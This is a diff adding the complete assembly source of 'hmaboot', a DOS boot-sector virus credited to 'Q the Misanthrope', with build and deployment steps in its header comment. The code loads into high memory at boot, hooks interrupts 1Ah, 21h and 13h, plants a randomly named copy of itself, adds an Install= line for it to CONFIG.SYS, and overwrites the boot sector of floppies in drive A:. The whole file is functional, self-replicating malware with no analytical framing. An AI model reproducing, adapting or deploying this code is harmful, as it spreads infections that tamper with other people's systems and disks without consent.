@@ -1,0 +1,335 @@
+comment *
+
+Designed by "Q" the Misanthrope
+
+This virus uses HMA memory extensively.  It boots directly into the HMA by the
+brute force method.  It then waits till DOS loads then creates a random file
+and adds an Install= statement to the CONFIG.SYS that loads the virus again
+into the HMA (not bad for 512 bytes.)  Also works with Windoze 95.
+
+tasm hmaboot /m2
+tlink hmaboot
+exe2bin hmaboot.exe hmaboot.com
+format a:/q/u
+debug hmaboot.com
+l 300 0 0 1
+w 100 0 0 1
+w 300 0 20 1
+m 11e,2ff 100
+w
+q
+copy hmaboot.com c:\BBFNJACD
+edit c:\config.sys
+Install=\BBFNJACD
+altf
+x
+y
+
+*
+
+.286
+
+qseg            segment byte public 'CODE'
+                assume  cs:qseg,es:qseg,ss:nothing,ds:qseg
+
+top:            jmp     short hma_install
+		db      90h                     
+                db      "MSDOS5.0"
+		dw      512
+		db      1 
+		dw      1 
+		db      2 
+		dw      224 
+		dw      2880
+		db      0F0h 
+		dw      9
+		dw      18 
+		dw      2 
+
+                org     001eh
+
+com_install     proc    near
+                mov     ax,3501h                ;tunnel to interrupt 21h
+                int     21h
+                mov     dx,offset interrupt_1-com_install+100h
+                mov     ah,25h                  ;set our interrupt 1 routine
+                push    es
+                int     21h
+                pop     ds                      ;set ds:dx to set int 1 back
+                push    00h                     ;es=00h
+                pop     es
+                pushf                           ;simulate interrupt stack
+                mov     dx,bx
+                push    cs                      ;simulate stack to return to
+                push    es                      ;cs:00h that terminates virus 
+                int     01h                     ;set interrupt trap bit
+                jmp     dword ptr es:[21h*04h]  ;simulate int 21 and trace it
+com_install     endp
+
+hma_install     proc    near                    ;brute force HMA access @ boot
+                pusha
+                mov     al,0d1h                 ;for 8042 keyboard controller
+                out     64h,al
+reloop:         in      al,64h
+                and     al,02h
+                jnz     reloop
+                mov     al,0e3h                 ;enable HMA
+                out     60h,al
+                popa
+es_si           equ     $+01h                   ;trick to get es:si point HMA
+make_hma:       mov     bx,7c00h                ;for reading boot sector
+                push    cs                      ;becomes fc0eh for es
+		cld     
+                pop     ds                      ;load es:si=fc0e:7c00 in HMA
+                les     si,dword ptr ds:[bx+offset es_si-top]
+                mov     cx,offset previous_hook ;loop counter
+                lea     di,word ptr ds:[si]     ;source is 0000:7c00
+                push    cs
+                push    bx
+                push    si
+                rep     movsb                   ;move it to HMA
+		pop     si
+                mov     cl,low((offset previous_hook-top)/2)
+                rep     movsw                   ;copy it again to HMA
+                mov     si,1ah*04h              ;hook interrupt 1ah
+                push    si
+                push    es
+                mov     ax,offset interrupt_1a+7e00h-02h
+                call    hook_interrupt          ;hook interrupt into HMA
+                mov     es,cx                   ;es=0 cx=low mem kernal length
+                mov     cl,low(offset make_hma-hma_install)
+                mov     di,0201h                ;for low mem stub and int 13
+                push    di
+                mov     si,offset hma_install+7c00h
+                rep     movsb                   ;HMA enable stub to low mem
+                mov     al,0eah                 ;far jump
+                stosb
+                pop     ax                      ;ax=0201 for int 13 read
+                pop     si                      ;point it 1a to stub
+                push    cs                      ;for far call return
+                call    hook_interrupt          ;set int 1a to point to stub
+hma_install     endp
+
+set_cx_dx       proc    near                    ;read original bootsector
+                mov     si,word ptr ds:[bx+11h] ;from last sector of root
+                shr     si,04h                  ;directory
+                mov     cx,word ptr ds:[bx+16h]
+                shl     cx,01h
+                add     cx,si
+                mov     dh,01h
+		inc     cx
+                sub     cx,word ptr ds:[bx+18h]
+                int     13h                     ;read it and then jump to it
+                retf
+set_cx_dx       endp
+
+config_line     db      "C:\Config.Sys",00      ;what to infect
+install_name    db      "Install="              ;what to add
+file_name       db      "\",00h                 ;random file goes here
+crlf            equ     $+07h                   ;a carrage return line feed
+
+interrupt_1     proc    near                    ;tunnel routine to hook int 21
+                pusha
+		push    sp
+                pop     bp
+		push    ds
+                push    es
+                lds     bx,dword ptr ss:[bp+10h];get instruction
+                cmp     word ptr ds:[bx+01h],02effh
+                jne     go_back                 ;was it a far indexed jump
+                cmp     byte ptr ds:[bx-0ah],6ah
+                je      toggle_tf               ;was it our code
+                mov     si,word ptr ds:[bx+03h] ;get index of jump
+                cmp     byte ptr ds:[si+03h],0f0h
+                jb      go_back                 ;was it in the HMA
+                mov     bh,high(((tail-com_install+10h)SHR 4)*10h)+01h
+                mov     di,0ffffh               ;if so then allocate HMA
+                mov     ax,4a02h                ;to load virus into
+                int     2fh
+                inc     di                      ;di=0 if no HMA
+                jz      toggle_tf
+                push    si                      ;save location of int 21 chain
+                cld
+                mov     cx,previous_hook-com_install
+                mov     si,0100h                ;copy virus to HMA
+                rep     movs byte ptr es:[di],cs:[si]
+                pop     si                      ;hook into int 21 chain
+                lea     ax,word ptr ds:[di-(offset previous_hook-resident_21)]
+                push    cs                      ;for far call
+                call    hook_interrupt          ;hook in
+toggle_tf:      xor     byte ptr ss:[bp+15h],01h;toggle single step flag
+go_back:        pop     es
+                pop     ds
+                popa                            ;pop all varables
+                iret                            ;return
+interrupt_1     endp                            
+
+hook_interrupt  proc    near                    ;hook interrupt 
+                movsw                           ;move ds:si to es:di
+                movsw                           ;4 bytes worth
+                mov     word ptr ds:[si-04h],ax ;hook into ds:si es:ax
+                mov     word ptr ds:[si-02h],es
+                retf                            ;return far
+hook_interrupt  endp
+
+interrupt_21    proc    near                    ;momentary int 21 routine
+                pushf
+		pusha   
+		push    ds
+                push    es
+		push    cs
+		pop     ds
+                mov     ax,3d42h                ;open config.sys
+                mov     dx,offset config_line+7e00h-02h
+                int     18h
+                mov     bx,5700h                ;get date
+                xchg    ax,bx
+                jc      retry_later             ;jump if error
+                int     18h
+                jcxz    close_it                ;check if infected
+                inc     ax                      ;for set date later
+                pusha                           ;save it
+                mov     ah,48h                  ;allocate lower memory for
+                mov     bx,0888h                ;disk write to config.sys
+                mov     cx,bx
+                int     18h
+                jc      popa_close_it
+                mov     es,ax                   ;new segment to copy virii to
+                mov     dx,offset file_name+7e00h-02h
+                mov     di,dx                   ;ds:dx points to virii name
+                lea     si,word ptr ds:[di]
+                std
+                rep     movsw                   ;move the virus to low mem
+                push    es
+                pop     ds
+                mov     ah,5ah                  ;create random file
+                int     18h
+                mov     dx,offset com_install+7c00h
+                mov     bh,40h                  ;now write it
+                xchg    ax,bx
+                mov     ch,02h                  ;at least 512 bytes worth
+                int     18h
+                mov     ah,3eh                  ;close it
+                int     18h
+                popa                            ;get handle of config.sys
+                pusha                           ;push it again
+                mov     ax,4202h                ;goto the end of config.sys
+		cwd
+                push    dx
+                pop     cx
+                int     18h
+                mov     ah,40h                  ;write install= line and crlf
+                mov     word ptr ds:[crlf+7e00h-02h],0a0dh
+                mov     cl,low(crlf-install_name+02h)
+                mov     dx,offset install_name+7e00h-02h
+                int     18h                     ;add line to config.sys
+                mov     ah,49h                  ;deallocate memory
+                int     18h
+popa_close_it:  popa                            ;get file date
+                sub     cx,cx                   ;mark that it is infected
+                int     18h
+close_it:       mov     ah,3eh                  ;close config.sys
+                int     18h
+set_21_back:    lds     dx,dword ptr ds:[previous_hook+7c00h]
+                jmp     short set_int_21        ;unkook int 21
+retry_later:    jmp     short jmp_pop_it     
+interrupt_21    endp
+
+interrupt_1a    proc    near                    ;interrupt 1a hook at startup
+                pushf
+		pusha
+                mov     ax,1200h                ;dos loaded yet?
+		push    ds
+		push    es
+		cwd
+                int     2fh
+                inc     al
+                jnz     jmp_pop_it
+                mov     ds,dx                   ;if so then unhook int 1a and
+                mov     si,21h*04h              ;hook int 21 and set int 18 
+                mov     di,offset previous_hook+7c00h
+                les     bx,dword ptr cs:[previous_hook+7e00h-02h]
+                mov     ds:[si-((21h-1ah)*04h)],bx
+                mov     ds:[si-((21h-1ah)*04h)+02h],es
+		les     bx,dword ptr ds:[si]
+                mov     ds:[si-((21h-18h)*04h)+02h],es
+                mov     ds:[si-((21h-18h)*04h)],bx
+                push    cs
+		cld     
+		pop     es
+		movsw
+                movsw                           ;hook in int 21
+                mov     dx,offset interrupt_21+7c00h
+                push    cs
+                pop     ds
+set_int_21:     mov     ax,2521h                ;set int 21
+                int     18h
+jmp_pop_it:     jmp     short pop_it
+interrupt_1a    endp
+
+                org     001aeh
+
+resident_21     proc    near                    ;resident int 21 routine
+                pushf
+                pusha
+                push    ds
+                push    es
+                cmp     ah,38h                  ;infect on get country code
+                jne     pop_it
+                mov     ah,19h                  ;see if drive a:
+                pushf
+                push    cs
+                call    far_jmp
+                or      al,al
+                jnz     pop_it                  ;if not then don't infect
+                call    next_line               ;get offset in HMA
+next_line:      pop     bx
+                add     bx,offset vbuffer-next_line
+                push    cs
+                mov     cx,0001h                ;read boot sector
+                pop     es
+                push    cs
+                mov     ax,0201h
+                cwd
+                pop     ds
+                int     13h
+                jc      pop_it                  ;any errors then leave
+                mov     di,0000h                ;move di the jmp instruction
+                org     $-02h                   ;at the start of the virii
+                jmp     $(hma_install-top)
+                cmp     di,word ptr ds:[bx]     ;check if it is infected
+                je      pop_it                  ;if so then leave
+                mov     ax,0301h                ;move old boot sector
+                pusha
+                push    cs                      ;for far call
+                call    set_cx_dx               ;write old boot sector
+                xchg    di,word ptr ds:[bx]     ;put jmp in boot sector
+                cld                             ;copy virii to boot sector
+                mov     cx,previous_hook-com_install
+                lea     si,word ptr ds:[bx-offset (vbuffer-com_install)]
+                lea     di,word ptr ds:[bx+com_install-top]
+                rep     movsb
+                popa                            ;write virus
+                int     13h
+pop_it:         pop     es                      ;clean the stack
+                pop     ds
+		popa    
+		popf
+resident_21     endp
+
+                org     001fdh                
+
+far_jmp         proc    near
+                db      0eah                    ;jump to previous hook
+previous_hook:  label   double
+far_jmp         endp
+
+boot_signature  dw      0aa55h                  ;boot sector thingy
+
+                org     $+02h
+vbuffer         label   byte                    ;where the reads/writes are
+                org     $+0202h
+tail            label   byte                    ;the end
+
+qseg            ends
+		end
